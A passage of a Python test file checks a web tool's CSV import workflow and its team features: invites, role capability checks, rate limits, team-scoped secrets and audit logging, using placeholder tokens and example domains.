                call.kwargs["extra"]
                for call in mock_apply_warning.call_args_list
                if call.args[0] == "ATLAS_IMPORT_APPLY_REJECTED"
                and "draft_status" in call.kwargs["extra"]
            )
            assert service_stale_warning["draft_status"] == "previewed"
            assert service_stale_warning["required_capabilities"] == []

            stale_applying = client.post(
                "/atlas/imports/preview",
                data={
                    "format_id": "generic_csv",
                    "source_tool": "External CSV",
                    "import_name": "Stale applying draft",
                    "file": (
                        io.BytesIO(b"row_type,entity_kind,entity_value\nentity,domain,applying.example\n"),
                        "applying.csv",
                    ),
                },
                headers={"X-Session-ID": session_id},
                content_type="multipart/form-data",
            )
            assert stale_applying.status_code == 200
            stale_applying_draft_id = stale_applying.get_json()["draft_id"]
            with db_connect() as conn:
                conn.execute(
                    "UPDATE atlas_import_drafts SET status = 'applying', expires_at = '2000-01-01 00:00:00' "
                    "WHERE id = ?",
                    (stale_applying_draft_id,),
                )
                conn.commit()
            with db_connect() as conn, mock.patch.object(atlas_import_workflow.log, "warning") as mock_cleanup_warning:
                assert atlas_import_workflow.cleanup_expired_import_drafts(conn=conn, now="2026-01-01 00:00:00") == 1
                conn.commit()
            stale_cleanup_warning = next(
                call.kwargs["extra"]
                for call in mock_cleanup_warning.call_args_list
                if call.args[0] == "ATLAS_IMPORT_APPLY_STALE_CLEANED"
            )
            assert stale_cleanup_warning["applying_count"] == 1

            stale_preview_cleanup = client.post(
                "/atlas/imports/preview",
                data={
                    "format_id": "generic_csv",
                    "source_tool": "External CSV",
                    "import_name": "Stale preview cleanup",
                    "file": (
                        io.BytesIO(b"row_type,entity_kind,entity_value\nentity,domain,preview-cleanup.example\n"),
                        "preview-cleanup.csv",
                    ),
                },
                headers={"X-Session-ID": session_id},
                content_type="multipart/form-data",
            )
            assert stale_preview_cleanup.status_code == 200
            stale_preview_draft_id = stale_preview_cleanup.get_json()["draft_id"]
            with db_connect() as conn:
                conn.execute(
                    "UPDATE atlas_import_drafts SET expires_at = '2000-01-01 00:00:00' WHERE id = ?",
                    (stale_preview_draft_id,),
                )
                conn.commit()
            with db_connect() as conn, mock.patch.object(atlas_import_workflow.log, "info") as mock_cleanup_info:
                assert atlas_import_workflow.cleanup_expired_import_drafts(conn=conn, now="2026-01-01 00:00:00") == 1
                conn.commit()
            cleanup_info = next(
                call.kwargs["extra"]
                for call in mock_cleanup_info.call_args_list
                if call.args[0] == "ATLAS_IMPORT_DRAFTS_CLEANED"
            )
            assert cleanup_info["previewed_count"] == 1

            preview = client.post(
                "/atlas/imports/preview",
                data={
                    "format_id": "generic_csv",
                    "source_tool": "External CSV",
                    "import_name": "Digest check",
                    "file": (
                        io.BytesIO(b"row_type,entity_kind,entity_value\nentity,domain,digest.example\n"),
                        "triage.csv",
                    ),
                },
                headers={"X-Session-ID": session_id},
                content_type="multipart/form-data",
            )
            assert preview.status_code == 200
            with db_connect() as conn:
                expired_count = conn.execute(
                    "SELECT COUNT(*) AS count FROM atlas_import_drafts WHERE id = ?",
                    (expired_draft_id,),
                ).fetchone()["count"]
            assert expired_count == 0
            with mock.patch("blueprints.atlas.log.warning") as mock_apply_warning:
                rejected = client.post(
                    "/atlas/imports/apply",
                    headers={"X-Session-ID": session_id},
                    json={
                        "draft_id": preview.get_json()["draft_id"],
                        "row_set_digest": "bad-digest",
                        "options": {"import_entities": True},
                    },
                )
            assert rejected.status_code == 400
            assert rejected.get_json()["error"] == "digest_mismatch"
            digest_warning = mock_apply_warning.call_args
            assert digest_warning.args[0] == "ATLAS_IMPORT_APPLY_REJECTED"
            assert digest_warning.kwargs["extra"]["reason"] == "digest_mismatch"
            assert digest_warning.kwargs["extra"]["status"] == 400
            assert digest_warning.kwargs["extra"]["import_entities"] is True
            service_digest_warning = next(
                call.kwargs["extra"]
                for call in mock_apply_warning.call_args_list
                if call.args[0] == "ATLAS_IMPORT_APPLY_REJECTED"
                and "draft_status" in call.kwargs["extra"]
            )
            assert service_digest_warning["draft_status"] == "previewed"
            assert service_digest_warning["option_import_entities"] is True

            with mock.patch.dict(config.CFG, {"atlas_import_max_findings": 1}, clear=False), \
                    mock.patch.object(atlas_import_workflow.log, "warning") as mock_limit_warning:
                too_many_findings = client.post(
                    "/atlas/imports/preview",
                    data={
                        "format_id": "generic_csv",
                        "source_tool": "External CSV",
                        "import_name": "Too many findings",
                        "file": (
                            io.BytesIO(
                                b"row_type,entity_kind,entity_value,title,severity\n"
                                b"finding,domain,one.example,One,low\n"
                                b"finding,domain,two.example,Two,low\n"
                            ),
                            "too-many.csv",
                        ),
                    },
                    headers={"X-Session-ID": session_id},
                    content_type="multipart/form-data",
                )
            assert too_many_findings.status_code == 400
            assert too_many_findings.get_json()["error"] == "import_limit_exceeded"
            limit_warning = next(
                call.kwargs["extra"]
                for call in mock_limit_warning.call_args_list
                if call.args[0] == "ATLAS_IMPORT_LIMIT_REJECTED"
            )
            assert limit_warning["limit_key"] == "atlas_import_max_findings"
            assert limit_warning["configured_limit"] == 1
            assert limit_warning["actual_count"] == 2
            assert limit_warning["stage"] == "preview"

            atlas_import_workflow._INVALID_CFG_LIMIT_WARNED.discard("atlas_import_preview_sample_limit")
            with mock.patch.dict(config.CFG, {"atlas_import_preview_sample_limit": "nope"}, clear=False), \
                    mock.patch.object(atlas_import_workflow.log, "warning") as mock_config_warning:
                invalid_config_preview = client.post(
                    "/atlas/imports/preview",
                    data={
                        "format_id": "generic_csv",
                        "source_tool": "External CSV",
                        "import_name": "Invalid config warning",
                        "file": (
                            io.BytesIO(b"row_type,entity_kind,entity_value\nentity,domain,config.example\n"),
                            "config.csv",
                        ),
                    },
                    headers={"X-Session-ID": session_id},
                    content_type="multipart/form-data",
                )
            assert invalid_config_preview.status_code == 200
            config_warning = next(
                call.kwargs["extra"]
                for call in mock_config_warning.call_args_list
                if call.args[0] == "ATLAS_IMPORT_CONFIG_LIMIT_INVALID"
            )
            assert config_warning["key"] == "atlas_import_preview_sample_limit"
            assert config_warning["default"] == atlas_import_workflow.PREVIEW_SAMPLE_LIMIT
            assert config_warning["configured_type"] == "str"
        finally:
            for patcher in reversed(patchers):
                patcher.stop()


class TestTeamRoutes:
    def _team_client(self, tmp_path):
        db_path = str(tmp_path / "team-routes.db")
        lock_path = str(tmp_path / "team-routes.lock")
        patchers = [
            mock.patch("core.database.DB_PATH", db_path),
            mock.patch("core.database.DB_INIT_LOCK_PATH", lock_path),
        ]
        for patcher in patchers:
            patcher.start()
        db_init()
        return get_client(), patchers

    def _register_session_token(self, session_id):
        with db_connect() as conn:
            conn.execute(
                "INSERT OR IGNORE INTO session_tokens (token, created, last_seen_at) VALUES (?, ?, ?)",
                (session_id, datetime.now(timezone.utc).isoformat(), ""),
            )
            conn.commit()

    def _create_team(self, client, session_id, name="Darklab Operators"):
        self._register_session_token(session_id)
        return client.post(
            "/session/teams",
            headers={"X-Session-ID": session_id},
            json={"name": name, "display_name": "Owner"},
        )

    def _join_team(self, client, owner_token, team_id, member_token, *, role="viewer", display_name="Viewer"):
        self._register_session_token(member_token)
        invite = client.post(
            f"/session/teams/{team_id}/invites",
            headers={"X-Session-ID": owner_token},
            json={"role": role, "label": f"{display_name} invite"},
        )
        assert invite.status_code == 201
        joined = client.post(
            "/session/teams/join",
            headers={"X-Session-ID": member_token},
            json={"code": invite.get_json()["invite"]["code"], "display_name": display_name},
        )
        assert joined.status_code in {200, 201}
        return next(
            member for member in joined.get_json()["members"]
            if member["display_name"] == display_name
        )

    def test_team_atlas_import_apply_requires_option_specific_capabilities(self, monkeypatch, tmp_path):
        from services.teams import capabilities
        from services.teams.capabilities import Capability

        client, patchers = self._team_client(tmp_path)
        try:
            owner_token = "tok_team_atlas_import_owner"
            operator_token = "tok_team_atlas_import_operator"
            viewer_token = "tok_team_atlas_import_viewer"
            self._register_session_token(operator_token)
            self._register_session_token(viewer_token)
            monkeypatch.setitem(
                capabilities.ROLE_CAPABILITIES,
                "operator",
                frozenset({Capability.VIEW_TEAM, Capability.TRIAGE_FINDINGS}),
            )
            created = self._create_team(client, owner_token, name="Atlas Import Capability")
            team_id = created.get_json()["team"]["id"]
            operator_invite = client.post(
                f"/session/teams/{team_id}/invites",
                headers={"X-Session-ID": owner_token},
                json={"role": "operator", "label": "Import triager"},
            )
            assert client.post(
                "/session/teams/join",
                headers={"X-Session-ID": operator_token},
                json={"code": operator_invite.get_json()["invite"]["code"], "display_name": "Import triager"},
            ).status_code == 201
            viewer_invite = client.post(
                f"/session/teams/{team_id}/invites",
                headers={"X-Session-ID": owner_token},
                json={"role": "viewer", "label": "Import viewer"},
            )
            assert client.post(
                "/session/teams/join",
                headers={"X-Session-ID": viewer_token},
                json={"code": viewer_invite.get_json()["invite"]["code"], "display_name": "Import viewer"},
            ).status_code == 201

            operator_headers = {"X-Session-ID": operator_token, "X-Team-ID": team_id}
            viewer_headers = {"X-Session-ID": viewer_token, "X-Team-ID": team_id}
            csv_payload = (
                "row_type,entity_kind,entity_value,title,severity,evidence\n"
                "finding,domain,team-import.example,Team import finding,high,evidence\n"
            ).encode()
            preview = client.post(
                "/atlas/imports/preview",
                data={
                    "format_id": "generic_csv",
                    "source_tool": "External CSV",
                    "import_name": "Team capability import",
                    "file": (io.BytesIO(csv_payload), "team-import.csv"),
                },
                headers=operator_headers,
                content_type="multipart/form-data",
            )
            assert preview.status_code == 200
            preview_payload = preview.get_json()
            assert preview_payload["apply_options"]["import_findings"]["available"] is False
            assert preview_payload["apply_options"]["import_findings"]["requires"] == [
                "triage_findings",
                "mutate_projects",
            ]

            rejected = client.post(
                "/atlas/imports/apply",
                headers=operator_headers,
                json={
                    "draft_id": preview_payload["draft_id"],
                    "row_set_digest": preview_payload["row_set_digest"],
                    "options": {"import_findings": True},
                },
            )
            assert rejected.status_code == 403
            assert rejected.get_json()["error"] == "team_forbidden"
            with db_connect() as conn:
                assert conn.execute("SELECT COUNT(*) AS count FROM entities").fetchone()["count"] == 0
                assert conn.execute("SELECT COUNT(*) AS count FROM findings").fetchone()["count"] == 0

            entity_preview = client.post(
                "/atlas/imports/preview",
                data={
                    "format_id": "generic_csv",
                    "source_tool": "External CSV",
                    "import_name": "Team entity capability import",
                    "file": (
                        io.BytesIO(b"row_type,entity_kind,entity_value\nentity,domain,entity-only.example\n"),
                        "team-entity-import.csv",
                    ),
                },
                headers=operator_headers,
                content_type="multipart/form-data",
            )
            assert entity_preview.status_code == 200
            entity_payload = entity_preview.get_json()
            assert entity_payload["apply_options"]["import_entities"]["available"] is False
            entity_rejected = client.post(
                "/atlas/imports/apply",
                headers=operator_headers,
                json={
                    "draft_id": entity_payload["draft_id"],
                    "row_set_digest": entity_payload["row_set_digest"],
                    "options": {"import_entities": True},
                },
            )
            assert entity_rejected.status_code == 403
            assert entity_rejected.get_json()["error"] == "team_forbidden"
            with db_connect() as conn:
                assert conn.execute("SELECT COUNT(*) AS count FROM entities").fetchone()["count"] == 0
                assert conn.execute("SELECT COUNT(*) AS count FROM findings").fetchone()["count"] == 0

            subject_only_payload = (
                b"row_type,subject,title,severity,evidence\n"
                b"finding,external-subject-1,Subject-only finding,low,subject evidence\n"
            )
            viewer_preview = client.post(
                "/atlas/imports/preview",
                data={
                    "format_id": "generic_csv",
                    "source_tool": "External CSV",
                    "import_name": "Viewer subject-only import",
                    "file": (io.BytesIO(subject_only_payload), "viewer-subject.csv"),
                },
                headers=viewer_headers,
                content_type="multipart/form-data",
            )
            assert viewer_preview.status_code == 200
            viewer_payload = viewer_preview.get_json()
            assert viewer_payload["apply_options"]["import_findings"]["available"] is False
            viewer_rejected = client.post(
                "/atlas/imports/apply",
                headers=viewer_headers,
                json={
                    "draft_id": viewer_payload["draft_id"],
                    "row_set_digest": viewer_payload["row_set_digest"],
                    "options": {"import_findings": True},
                },
            )
            assert viewer_rejected.status_code == 403
            assert viewer_rejected.get_json()["error"] == "team_forbidden"
            with db_connect() as conn:
                assert conn.execute("SELECT COUNT(*) AS count FROM entities").fetchone()["count"] == 0
                assert conn.execute("SELECT COUNT(*) AS count FROM findings").fetchone()["count"] == 0

            subject_preview = client.post(
                "/atlas/imports/preview",
                data={
                    "format_id": "generic_csv",
                    "source_tool": "External CSV",
                    "import_name": "Team subject-only import",
                    "file": (io.BytesIO(subject_only_payload), "team-subject.csv"),
                },
                headers=operator_headers,
                content_type="multipart/form-data",
            )
            assert subject_preview.status_code == 200
            subject_payload = subject_preview.get_json()
            assert subject_payload["counts"]["finding_subject_entities_to_create"] == 0
            assert subject_payload["apply_options"]["import_findings"]["available"] is True
            assert subject_payload["apply_options"]["import_findings"]["requires"] == ["triage_findings"]

            with db_connect() as conn:
                existing_entity_id = "ent_team_import_existing"
                existing_value = "team-import-existing.example"
                existing_signature = hashlib.sha256(
                    f"domain\x1f{existing_value}".encode("utf-8", errors="replace")
                ).hexdigest()
                conn.execute(
                    "INSERT INTO entities "
                    "(id, session_id, team_id, type, canonical_value, signature_hash, first_seen_at, last_seen_at, created) "
                    "VALUES (?, ?, ?, 'domain', ?, ?, ?, ?, ?)",
                    (
                        existing_entity_id,
                        owner_token,
                        team_id,
                        existing_value,
                        existing_signature,
                        "2026-06-01T00:00:00+00:00",
                        "2026-06-01T00:00:00+00:00",
                        "2026-06-01T00:00:00+00:00",
                    ),
                )
                conn.commit()

            stale_preview = client.post(
                "/atlas/imports/preview",
                data={
                    "format_id": "generic_csv",
                    "source_tool": "External CSV",
                    "import_name": "Team stale capability import",
                    "file": (
                        io.BytesIO(
                            b"row_type,entity_kind,entity_value,title,severity,evidence\n"
                            b"finding,domain,team-import-existing.example,Existing entity finding,high,evidence\n"
                        ),
                        "team-stale-import.csv",
                    ),
                },
                headers=operator_headers,
                content_type="multipart/form-data",
            )
            assert stale_preview.status_code == 200
            stale_payload = stale_preview.get_json()
            assert stale_payload["apply_options"]["import_findings"]["available"] is True
            assert stale_payload["apply_options"]["import_findings"]["requires"] == ["triage_findings"]

            with db_connect() as conn:
                conn.execute("DELETE FROM entities WHERE id = ?", (existing_entity_id,))
                conn.commit()

            stale_rejected = client.post(
                "/atlas/imports/apply",
                headers=operator_headers,
                json={
                    "draft_id": stale_payload["draft_id"],
                    "row_set_digest": stale_payload["row_set_digest"],
                    "options": {"import_findings": True},
                },
            )
            assert stale_rejected.status_code == 403
            assert stale_rejected.get_json()["error"] == "team_forbidden"
            with db_connect() as conn:
                assert conn.execute("SELECT COUNT(*) AS count FROM entities").fetchone()["count"] == 0
                assert conn.execute("SELECT COUNT(*) AS count FROM findings").fetchone()["count"] == 0

            subject_applied = client.post(
                "/atlas/imports/apply",
                headers=operator_headers,
                json={
                    "draft_id": subject_payload["draft_id"],
                    "row_set_digest": subject_payload["row_set_digest"],
                    "options": {"import_findings": True},
                },
            )
            assert subject_applied.status_code == 200
            assert subject_applied.get_json()["counts"]["findings_created"] == 1
            assert subject_applied.get_json()["counts"]["entities_created"] == 0
            with db_connect() as conn:
                assert conn.execute("SELECT COUNT(*) AS count FROM entities").fetchone()["count"] == 0
                assert conn.execute("SELECT COUNT(*) AS count FROM findings").fetchone()["count"] == 1
                finding_row = conn.execute(
                    "SELECT team_id, subject_key, title FROM findings"
                ).fetchone()
            assert finding_row["team_id"] == team_id
            assert finding_row["subject_key"] == "external-subject-1"
            assert finding_row["title"] == "Subject-only finding"
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_team_create_list_and_detail(self, tmp_path):
        client, patchers = self._team_client(tmp_path)
        try:
            session_id = "tok_team_owner"
            created = self._create_team(client, session_id)

            assert created.status_code == 201
            payload = created.get_json()
            assert payload["team"]["name"] == "Darklab Operators"
            assert payload["team"]["member"]["role"] == "owner"
            assert "archive_team" in payload["team"]["member"]["capabilities"]
            assert "manage_recovery" in payload["team"]["member"]["capabilities"]
            assert payload["recovery_code"].startswith("trec_")
            assert "created_by_session_token_hash" not in created.get_data(as_text=True)
            assert "code_hash" not in created.get_data(as_text=True)
            audit_rows = _audit_event_rows(target_id=payload["team"]["id"], event_type="team.create")
            assert len(audit_rows) == 1
            assert audit_rows[0]["target_type"] == "team"
            assert audit_rows[0]["details"] == {"source": "browser", "role": "owner"}
            assert payload["recovery_code"] not in json.dumps(audit_rows)

            listed = client.get("/session/teams", headers={"X-Session-ID": session_id})
            assert listed.status_code == 200
            assert listed.get_json()["teams"][0]["id"] == payload["team"]["id"]

            detail = client.get(f"/session/teams/{payload['team']['id']}", headers={"X-Session-ID": session_id})
            assert detail.status_code == 200
            detail_payload = detail.get_json()
            assert detail_payload["members"][0]["role"] == "owner"
            assert "manage_invites" in detail_payload["members"][0]["capabilities"]
            assert detail_payload["recovery_codes"][0]["used_at"] == ""
            assert "code_hash" not in detail.get_data(as_text=True)

            with mock.patch.object(shell_app.log, "error") as mock_error, mock.patch(
                "services.teams.storage.rotate_team_recovery_code",
                side_effect=RuntimeError("recovery unavailable"),
            ):
                failed = self._create_team(client, session_id, name="Rollback Operators")
            assert failed.status_code == 500
            assert failed.get_json()["error"] == "team_route_failed"
            assert mock_error.call_args.args[0] == "TEAM_ROUTE_FAILED"
            assert mock_error.call_args.kwargs["exc_info"] is True
            error_extra = mock_error.call_args.kwargs["extra"]
            assert error_extra["action"] == "create"
            assert error_extra["status"] == 500
            assert error_extra["route"] == "/session/teams"
            with db_connect() as conn:
                team_count = conn.execute(
                    "SELECT COUNT(*) AS count FROM teams WHERE slug = ?",
                    ("rollback-operators",),
                ).fetchone()["count"]
                member_count = conn.execute(
                    "SELECT COUNT(*) AS count FROM team_members WHERE team_id IN "
                    "(SELECT id FROM teams WHERE slug = ?)",
                    ("rollback-operators",),
                ).fetchone()["count"]
            assert team_count == 0
            assert member_count == 0
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_team_browser_read_routes_have_dedicated_token_limit(self, monkeypatch, tmp_path):
        client, patchers = self._team_client(tmp_path)
        try:
            session_id = "tok_team_read_rate"
            other_session_id = "tok_team_read_rate_other"
            self._register_session_token(session_id)
            self._register_session_token(other_session_id)
            monkeypatch.setitem(shell_app.CFG, "rate_limit_per_minute", 1000)
            monkeypatch.setitem(shell_app.CFG, "rate_limit_per_second", 1000)
            monkeypatch.setitem(shell_app.CFG, "team_read_rate_limit_per_minute", 1)
            monkeypatch.setitem(shell_app.CFG, "team_read_rate_limit_per_second", 100)
            monkeypatch.setitem(shell_app.CFG, "team_write_rate_limit_per_minute", 1000)

            first = client.get("/session/teams", headers={"X-Session-ID": session_id})
            second = client.get("/session/teams", headers={"X-Session-ID": session_id})
            other = client.get("/session/teams", headers={"X-Session-ID": other_session_id})

            assert first.status_code == 200
            assert second.status_code == 429
            assert second.get_json()["error"] == "Rate limit exceeded. Please slow down."
            assert other.status_code == 200
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_active_team_scope_uses_explicit_team_secrets_for_providers_and_commands(self, monkeypatch, tmp_path):
        from blueprints import run as run_routes
        from blueprints import secrets as secrets_routes
        from services.commands import builtins_secrets
        from services.secrets.storage import get_secret_value_for_env

        key = base64.b64encode(b"s" * 32).decode("ascii")
        monkeypatch.setenv("SECRETS_MASTER_KEY", key)
        monkeypatch.setattr(secrets_vault, "resolve_data_dir", lambda: str(tmp_path / "team-secrets"))
        secrets_vault.reset_master_key_cache_for_tests()

        client, patchers = self._team_client(tmp_path)
        try:
            owner_token = "tok_team_secrets_owner"
            operator_token = "tok_team_secrets_operator"
            self._register_session_token(operator_token)
            created = self._create_team(client, owner_token, name="Secret Operators")
            team_id = created.get_json()["team"]["id"]
            owner_member_id = created.get_json()["team"]["member"]["id"]
            invite = client.post(
                f"/session/teams/{team_id}/invites",
                headers={"X-Session-ID": owner_token},
                json={"role": "operator", "label": "Secret operator"},
            )
            assert invite.status_code == 201
            joined = client.post(
                "/session/teams/join",
                headers={"X-Session-ID": operator_token},
                json={"code": invite.get_json()["invite"]["code"], "display_name": "Secret operator"},
            )
            assert joined.status_code == 201
            operator_member_id = next(
                member["id"] for member in joined.get_json()["members"] if member["role"] == "operator"
            )

            route_secret_events = []
            builtin_secret_events = []
            with mock.patch.object(
                secrets_routes,
                "emit_secret_event",
                side_effect=lambda event, session_id, **extra: route_secret_events.append((event, session_id, extra)),
            ), mock.patch.object(
                builtins_secrets,
                "emit_secret_event",
                side_effect=lambda event, session_id, **extra: builtin_secret_events.append((event, session_id, extra)),
            ):
                personal_secret = client.post(
                    "/session/secrets",
                    headers={"X-Session-ID": owner_token},
                    json={"name": "SHODAN_API_KEY", "value": "personal-shodan"},
                )
                team_secret = client.post(
                    "/session/secrets",
                    headers={"X-Session-ID": owner_token, "X-Team-ID": team_id},
                    json={"name": "SHODAN_API_KEY", "value": "team-shodan"},
                )
                operator_denied = client.post(
                    "/session/secrets",
                    headers={"X-Session-ID": operator_token, "X-Team-ID": team_id},
                    json={"name": "VT_API_KEY", "value": "operator-secret"},
                )
                team_list = client.get(
                    "/session/secrets",
                    headers={"X-Session-ID": operator_token, "X-Team-ID": team_id},
                )
                personal_list = client.get("/session/secrets", headers={"X-Session-ID": operator_token})

                assert personal_secret.status_code == 201
                assert team_secret.status_code == 201
                assert team_secret.get_json()["scope"] == "team"
                assert operator_denied.status_code == 403
                assert operator_denied.get_json()["error"] == "team_forbidden"
                assert team_list.status_code == 200
                team_payload = team_list.get_json()
                assert team_payload["scope"] == "team"
                assert team_payload["can_manage"] is False
                assert [secret["name"] for secret in team_payload["secrets"]] == ["SHODAN_API_KEY"]
                assert "team-shodan" not in team_list.get_data(as_text=True)
                assert personal_list.status_code == 200
                assert personal_list.get_json()["secrets"] == []
                assert get_secret_value_for_env(team_id, "SHODAN_API_KEY") == "team-shodan"
                assert get_secret_value_for_env(operator_token, "SHODAN_API_KEY") is None

                provider_lines, provider_exit_code = execute_builtin_command(
                    "providers",
                    operator_token,
                    team_id=team_id,
                    team_role="operator",
                )
                provider_text = _builtin_lines_text(provider_lines)
                env_overrides, secret_env_names = run_routes._resolve_secret_environment(
                    "shodan host 8.8.8.8",
                    owner_token,
                    team_id=team_id,
                )

                assert provider_exit_code == 0
                assert "Shodan" in provider_text
                assert "configured" in provider_text
                assert env_overrides == {"SHODAN_API_KEY": "team-shodan"}
                assert secret_env_names == ["SHODAN_API_KEY"]

                unset_lines, _ = execute_builtin_command(
                    "secret unset SHODAN_API_KEY",
                    owner_token,
                    team_id=team_id,
                    team_role="owner",
                )
                noop_lines, _ = execute_builtin_command(
                    "secret unset SHODAN_API_KEY",
                    owner_token,
                    team_id=team_id,
                    team_role="owner",
                )
                assert "SHODAN_API_KEY removed." in _builtin_lines_text(unset_lines)
                assert "SHODAN_API_KEY was not set." in _builtin_lines_text(noop_lines)

            team_created_event = next(
                event for event in route_secret_events
                if event[0] == "SECRET_CREATED" and event[2].get("team_id") == team_id
            )
            denied_event = next(event for event in route_secret_events if event[0] == "SECRET_ACTION_REJECTED")
            assert team_created_event[2]["actor_member_id"] == owner_member_id
            assert team_created_event[2]["actor_role"] == "owner"
            assert team_created_event[2]["surface"] == "browser"
            assert denied_event[1] == operator_token
            assert denied_event[2]["actor_member_id"] == operator_member_id
            assert denied_event[2]["actor_role"] == "operator"
            assert denied_event[2]["surface"] == "browser"
            assert denied_event[2]["reason"] == "team_forbidden"
            assert denied_event[2]["level"] == logging.WARNING

            assert [event[0] for event in builtin_secret_events] == ["SECRET_DELETED", "SECRET_DELETE_NOOP"]
            assert builtin_secret_events[0][1] == owner_token
            assert builtin_secret_events[0][2]["name"] == "SHODAN_API_KEY"
            assert builtin_secret_events[0][2]["team_id"] == team_id
            assert builtin_secret_events[0][2]["actor_role"] == "owner"
            assert builtin_secret_events[0][2]["surface"] == "terminal_builtin"
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_team_invite_join_role_update_and_revoke(self, tmp_path):
        client, patchers = self._team_client(tmp_path)
        try:
            owner_token = "tok_team_invite_owner"
            operator_token = "tok_team_invite_operator"
            late_operator_token = "tok_team_invite_late_operator"
            self._register_session_token(operator_token)
            self._register_session_token(late_operator_token)
            created = self._create_team(client, owner_token)
            team_id = created.get_json()["team"]["id"]

            invite = client.post(
                f"/session/teams/{team_id}/invites",
                headers={"X-Session-ID": owner_token},
                json={"role": "operator", "label": "Operator invite"},
            )
            assert invite.status_code == 201
            invite_payload = invite.get_json()["invite"]
            assert invite_payload["code"].startswith("tinv_")
            assert "code_hash" not in invite.get_data(as_text=True)

            joined = client.post(
                "/session/teams/join",
                headers={"X-Session-ID": operator_token},
                json={"code": invite_payload["code"], "display_name": "Operator"},
            )
            assert joined.status_code == 201
            members = joined.get_json()["members"]
            operator_member = next(item for item in members if item["display_name"] == "Operator")
            assert operator_member["role"] == "operator"

            late_join = client.post(
                "/session/teams/join",
                headers={"X-Session-ID": late_operator_token},
                json={"code": invite_payload["code"], "display_name": "Late operator"},
            )
            assert late_join.status_code == 400
            assert late_join.get_json()["message"] == "Invite code has already been used"

            with mock.patch.object(shell_app.log, "warning") as mock_warn:
                denied = client.post(
                    f"/session/teams/{team_id}/invites",
                    headers={"X-Session-ID": operator_token},
                    json={"role": "viewer"},
                )
            assert denied.status_code == 403
            assert denied.get_json()["error"] == "team_forbidden"
            rejected_extra = mock_warn.call_args.kwargs["extra"]
            assert mock_warn.call_args.args[0] == "TEAM_ACTION_REJECTED"
            assert rejected_extra["action"] == "invite_create"
            assert rejected_extra["reason"] == "team_forbidden"
            assert rejected_extra["actor_role"] == "operator"

            promoted = client.patch(
                f"/session/teams/{team_id}/members/{operator_member['id']}",
                headers={"X-Session-ID": owner_token},
                json={"role": "admin"},
            )
            assert promoted.status_code == 200
            assert promoted.get_json()["member"]["role"] == "admin"

            admin_invite = client.post(
                f"/session/teams/{team_id}/invites",
                headers={"X-Session-ID": operator_token},
                json={"role": "viewer"},
            )
            assert admin_invite.status_code == 201

            revoked = client.delete(
                f"/session/teams/{team_id}/invites/{invite_payload['id']}",
                headers={"X-Session-ID": owner_token},
            )
            assert revoked.status_code == 200
            assert revoked.get_json()["removed"] is True
            removed = client.delete(
                f"/session/teams/{team_id}/members/{operator_member['id']}",
                headers={"X-Session-ID": owner_token},
            )
            assert removed.status_code == 200
            assert removed.get_json()["removed"] is True
            audit_rows = _audit_event_rows(target_id=team_id)
            assert [row["event_type"] for row in audit_rows] == [
                "team.create",
                "team.invite",
                "team.join",
                "team.role_change",
                "team.invite",
                "team.revoke",
                "team.member_remove",
            ]
            assert audit_rows[1]["details"]["target_invite_id"] == invite_payload["id"]
            assert audit_rows[1]["details"]["role"] == "operator"
            assert audit_rows[2]["details"]["target_member_id"] == operator_member["id"]
            assert audit_rows[2]["details"]["kind"] == "invite"
            assert audit_rows[3]["details"]["from_role"] == "operator"
            assert audit_rows[3]["details"]["to_role"] == "admin"
            assert audit_rows[-2]["details"]["kind"] == "invite"
            assert audit_rows[-1]["details"]["target_member_id"] == operator_member["id"]
            assert invite_payload["code"] not in json.dumps(audit_rows)
        finally:
            for patcher in reversed(patchers):
                patcher.stop()

    def test_team_activity_route_is_owner_admin_scoped_and_safe(self, tmp_path):
        from services.audit.models import AuditEventType
        from services.audit.recorder import record_event

        client, patchers = self._team_client(tmp_path)
        try:
            owner_token = "tok_team_activity_owner_" + uuid.uuid4().hex[:8]
            admin_token = "tok_team_activity_admin_" + uuid.uuid4().hex[:8]
            viewer_token = "tok_team_activity_viewer_" + uuid.uuid4().hex[:8]
            outsider_token = "tok_team_activity_outsider_" + uuid.uuid4().hex[:8]
            self._register_session_token(outsider_token)
            created = self._create_team(client, owner_token, name="Team Activity Route")
            assert created.status_code == 201
            team_payload = created.get_json()["team"]
            team_id = team_payload["id"]
            owner_member_id = team_payload["member"]["id"]
            admin_member = self._join_team(
                client,
                owner_token,
                team_id,
                admin_token,
                role="admin",
                display_name="Activity Admin",
            )
            viewer_member = self._join_team(
                client,
                owner_token,
                team_id,
                viewer_token,
                role="viewer",
                display_name="Activity Viewer",
            )
            with db_connect() as conn:
                record_event(
                    AuditEventType.TEAM_ROLE_CHANGE,
                    session_id=owner_token,
                    team_id=team_id,
                    actor_member_id=owner_member_id,
                    actor_role="owner",
                    actor_display_name="Owner",
                    target_id=team_id,
                    details={
                        "target_member_id": admin_member["id"],
                        "from_role": "operator",
                        "to_role": "admin",
                    },
                    conn=conn,
                    cfg={"audit_log_enabled": True},
                    created="2026-06-06T12:00:00+00:00",
                )
                record_event(
                    AuditEventType.TEAM_ROLE_CHANGE,
                    session_id=admin_token,
                    team_id=team_id,
                    actor_member_id=admin_member["id"],
                    actor_role="admin",
                    actor_display_name="Activity Admin",
                    target_id=team_id,
                    details={
                        "target_member_id": viewer_member["id"],
                        "from_role": "viewer",
                        "to_role": "operator",
                    },
                    conn=conn,
                    cfg={"audit_log_enabled": True},
                    created="2026-06-06T12:05:00+00:00",
                )
                record_event(
                    AuditEventType.NOTIFICATION_CONFIG_CHANGE,
                    session_id=admin_token,
                    team_id=team_id,
                    actor_member_id=admin_member["id"],
                    actor_role="admin",
                    actor_display_name="Activity Admin",
                    target_id="chn_team_activity",
                    details={
                        "channel_id": "chn_team_activity",
                        "action": "update",
                    },
                    conn=conn,
                    cfg={"audit_log_enabled": True},
                    created="2026-06-06T12:10:00+00:00",
                )
                record_event(
                    AuditEventType.TEAM_ROLE_CHANGE,
                    session_id=owner_token,
                    team_id="team_should_not_leak",
                    target_id="team_should_not_leak",
                    details={"to_role": "owner"},
                    conn=conn,
                    cfg={"audit_log_enabled": True},
                    created="2026-06-06T12:00:01+00:00",
                )
                conn.commit()

            owner = client.get(
                f"/session/teams/{team_id}/activity?event_type=team.role_change"
                "&date_from=2026-06-06&date_to=2026-06-06",
                headers={"X-Session-ID": owner_token},
            )
            assert owner.status_code == 200
            owner_payload = owner.get_json()
            assert [event["details"].get("to_role") for event in owner_payload["events"]] == ["operator", "admin"]
